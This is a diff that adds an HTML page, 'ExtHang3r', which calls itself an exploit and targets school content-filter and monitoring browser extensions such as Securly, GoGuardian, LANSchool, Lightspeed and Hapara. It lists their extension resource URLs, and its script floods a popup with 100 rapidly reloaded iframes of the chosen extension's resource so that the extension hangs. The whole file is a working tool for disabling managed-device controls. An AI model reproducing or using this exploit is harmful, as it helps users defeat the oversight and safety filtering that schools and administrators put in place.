@@ -1,0 +1,163 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>ExtHang3r</title>
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Varela+Round&display=swap"> <!-- Added font import -->
+  <style>
+    body {
+      font-family: 'Varela Round', sans-serif; /* Added font-family */
+      margin: 0;
+      padding: 0;
+    }
+    header {
+      background-color: #333;
+      color: #fff;
+      padding: 10px;
+      text-align: center;
+      display: flex;
+      align-items: center;
+      justify-content: center; /* Added to center the content horizontally */
+    }
+    .logo {
+      width: 50px;
+      height: 50px;
+      margin-right: 10px;
+    }
+    .container {
+      max-width: 800px;
+      margin: 150px auto 0 auto; /* Adjusted margin-top to 200px */
+      padding: 20px;
+      text-align: center; /* Added to center the content horizontally */
+      display: flex; /* Added to use flexbox */
+      flex-direction: column; /* Added to stack elements vertically */
+      align-items: center; /* Added to center children horizontally */
+    }
+    select {
+      margin-bottom: 10px; /* Added margin bottom */
+    }
+    button {
+      font-family: 'Varela Round', sans-serif; /* Added font-family */
+      background-color: #007bff;
+      color: #fff;
+      border: none;
+      padding: 10px 20px;
+      font-size: 16px;
+      cursor: pointer;
+      border-radius: 5px;
+      margin-top: 10px; /* Added margin-top */
+    }
+    button:hover {
+      background-color: #0056b3;
+    }
+    .overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-color: rgba(0, 0, 0, 0.5);
+      display: none;
+      justify-content: center;
+      align-items: center;
+      z-index: 9999;
+      color: #fff;
+      font-size: 24px;
+    }
+    footer {
+      background-color: #333;
+      color: #fff;
+      text-align: center;
+      padding: 10px;
+      position: fixed;
+      bottom: 0;
+      width: 100%;
+    }
+  </style>
+</head>
+<body>
+
+<header>
+  <img src="https://blobby-boi.github.io/uBlobeBM/favicon.png" alt="Logo" class="logo">
+  <h1>ExtHang3r</h1>
+</header>
+
+<div class="container">
+  <p>ExtHang3r is an exploit that allows you to hang extensions after the LTMEAT patch.</p>
+  <label for="iframeSelect">Select extension:</label>
+  <select id="iframeSelect">
+    <option value="chrome-extension://joflmkccibkooplaeoinecjbmdebglab/fonts/Metropolis.css">Securly</option>
+    <option value="chrome-extension://iheobagjkfklnlikgihanlhcddjoihkg/fonts/Metropolis.css">Securly (old)</option>
+    <option value="chrome-extension://haldlgldplgnggkjaafhelgiaglafanh/youtube_injection.js">Goguardian</option>
+    <option value="chrome-extension://baleiojnjpgeojohhhfbichcodgljmnj/blocked.html">LANSchool</option>
+    <option value="chrome-extension://ddfbkhpmcdbciejenfcolaaiebnjcbfc/background/assets/pages/default-blocked.html">Linewize</option>
+    <option value="chrome-extension://ghlpmldmjjhmdgmneoaibbegkjjbonbk/pages/blockPage.html">Blocksi</option>
+    <option value="chrome-extension://igbgpehnbmhgdgjbhkkpedommgmfbeao/youtube_injection.js">Fortiguard</option>
+    <option value="chrome-extension://jcdhmojfecjfmbdpchihbeilohgnbdci/blocked.html">Cisco Umbrella</option>
+    <option value="chrome-extension://jdogphakondfdmcanpapfahkdomaicfa/img/ckauth19x.png">ContentKeeper</option>
+    <option value="chrome-extension://odoanpnonilogofggaohhkdkdgbhdljp/img/ckauth19x.png">CK-Authenticator G3</option>
+    <option value="chrome-extension://jfbecfmiegcjddenjhlbhlikcbfmnafd/notfound.html">Securly Classroom</option>
+    <option value="chrome-extension://kbohafcopfpigkjdimdcdgenlhkmhbnc/blocked.html">Hapara</option>
+    <option value="chrome-extension://aceopacgaepdcelohobicpffbbejnfac/blocked.html">Hapara (new ID)</option>
+    <option value="chrome-extension://kmffehbidlalibfeklaefnckpidbodff/restricted.html">iboss</option>
+    <option value="chrome-extension://adkcpkpghahmbopkjchobieckeoaoeem/icon-128.png">Lightspeed Filter Agent</option>
+    <option value="chrome-extension://kkbmdgjggcdajckdlbngdjonpchpaiea/assets/icon-classroom-128.png">Lightspeed Classroom</option>
+    <option value="chrome-extension://jbddgjglgkkneonnineaohdhabjbgopi/pages/message-page.html">InterCLASS Filtering Service</option>
+    <option value="chrome-extension://ecjoghccnjlodjlmkgmnbnkdcbnjgden/resources/options.js">InterSafe GatewayConnection Agent</option>
+    <option value="chrome-extension://pabjlbjcgldndnpjnokjakbdofjgnfia/image/allow_icon/shield_green_128x128.png">ロイロWebフィルター/LoiLo Web Filters</option>
+    <option value="chrome-extension://cgbbbjmgdpnifijconhamggjehlamcif/images/gopher-buddy_128x128_color.png">Gopher Buddy</option>
+    <option value="chrome-extension://honjcnefekfnompampcpmcdadibmjhlk/blocked.html">LanSchool Web Helper</option>
+    <option value="chrome-extension://cgigopjakkeclhggchgnhmpmhghcbnaf/models/model.json">IMTLazarus</option>
+    <option value="chrome-extension://jjpmjccpemllnmgiaojaocgnakpmfgjg/licenses.html">Impero Backdrop</option>
+    <option value="chrome-extension://fgmafhdohjkdhfaacgbgclmfgkgokgmb/block.html">Mobile Guardian</option>
+  </select>
+  <button onclick="warning();">Hang Extension!</button> <!-- Moved button below the dropdown -->
+</div>
+
+<div class="overlay" id="overlay">Hanging...</div>
+
+<footer>
+  <p>Made by <a href="https://github.com/Blobby-Boi/">Blobby Boi</a></p>
+</footer>
+
+<script>
+  function replaceIframes(container, iframeSrc) {
+    for (var i = 0; i < 100; i++) { // Changed loop iteration to 100
+      var iframe = document.createElement('iframe');
+      iframe.src = iframeSrc; // Set the source URL of your iframe here
+      iframe.style.width = '100%';
+      iframe.style.height = '100px'; // Adjust height as needed
+      container.appendChild(iframe);
+    }
+    setTimeout(function() {
+      while (container.firstChild) {
+        container.removeChild(container.firstChild);
+      }
+      replaceIframes(container, iframeSrc);
+    }, 10); // Replace iframes every 10 milliseconds
+  }
+  
+  function warning() {
+    var overlay = document.getElementById("overlay");
+    overlay.style.display = "flex"; // Show the overlay
+    var iframeSelect = document.getElementById("iframeSelect");
+    var selectedOption = iframeSelect.options[iframeSelect.selectedIndex].text;
+    var selectedSrc = iframeSelect.value;
+    var popup = window.open("", "PopupWindow", "width=100,height=100"); // Open a new popup window
+    var popupDocument = popup.document;
+    var popupBody = popupDocument.body;
+    var iframeContainer = popupDocument.createElement('div');
+    iframeContainer.id = 'iframeContainer';
+    popupBody.appendChild(iframeContainer);
+    replaceIframes(iframeContainer, selectedSrc);
+    setTimeout(function() {
+      popup.close();
+      overlay.style.display = "none"; // Hide the overlay after 10 seconds
+      alert(selectedOption + " was hanged successfully!");
+    }, 10000); // Close popup after 10 seconds
+  }
+</script>
+
+</body>
+</html>
